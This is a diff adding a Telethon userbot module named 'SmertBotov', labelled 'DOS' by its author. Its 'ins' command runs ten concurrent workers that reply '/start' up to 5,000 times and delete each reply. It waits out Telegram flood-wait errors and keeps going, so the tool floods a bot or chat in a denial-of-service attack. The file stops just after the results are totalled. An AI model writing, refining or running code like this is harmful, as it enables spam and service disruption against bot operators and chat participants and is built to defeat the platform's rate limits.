@@ -1,0 +1,68 @@
+# meta developer: @sheomod
+# meta banner: https://t.me/xsheo
+
+from asyncio import sleep, gather, create_task
+from telethon.errors import FloodWaitError, MessageDeleteError
+
+from .. import loader, utils
+
+
+@loader.tds
+class SmertBotov(loader.Module):
+    """DOS"""
+
+    strings = {"name": "smertbotov"}
+
+    _CONCURRENCY = 10
+    _MAX_COUNT = 5000
+    _DELAY_BETWEEN = 0.1
+
+    async def _worker(self, message, count: int) -> int:
+        sent_ok = 0
+        consecutive_errors = 0
+        for _ in range(count):
+            try:
+                sent = await message.reply("<b>/start</b>")
+                try:
+                    await sent.delete()
+                except MessageDeleteError:
+                    pass
+                sent_ok += 1
+                consecutive_errors = 0
+            except FloodWaitError as e:
+                await sleep(e.seconds + 1)
+            except Exception:
+                consecutive_errors += 1
+                if consecutive_errors >= 5:
+                    return sent_ok
+                continue
+            if self._DELAY_BETWEEN:
+                await sleep(self._DELAY_BETWEEN)
+        return sent_ok
+
+    @loader.command()
+    async def ins(self, message):
+        """[кол-во] — Тыр Тыр, восемь дыр"""
+        args = utils.get_args_raw(message)
+        try:
+            count = int(args)
+        except (TypeError, ValueError):
+            return await utils.answer(message, "Укажи число.")
+        if count < 1:
+            return await utils.answer(message, "Число должно быть >= 1.")
+        if count > self._MAX_COUNT:
+            return await utils.answer(
+                message, f"Максимум — {self._MAX_COUNT}."
+            )
+
+        await message.delete()
+
+        base, rem = divmod(count, self._CONCURRENCY)
+        tasks = [
+            create_task(self._worker(message, base + (1 if i < rem else 0)))
+            for i in range(self._CONCURRENCY)
+            if base + (1 if i < rem else 0) > 0
+        ]
+        results = await gather(*tasks, return_exceptions=True)
+
+        total = sum(r for r in results if isinstance(r, int))
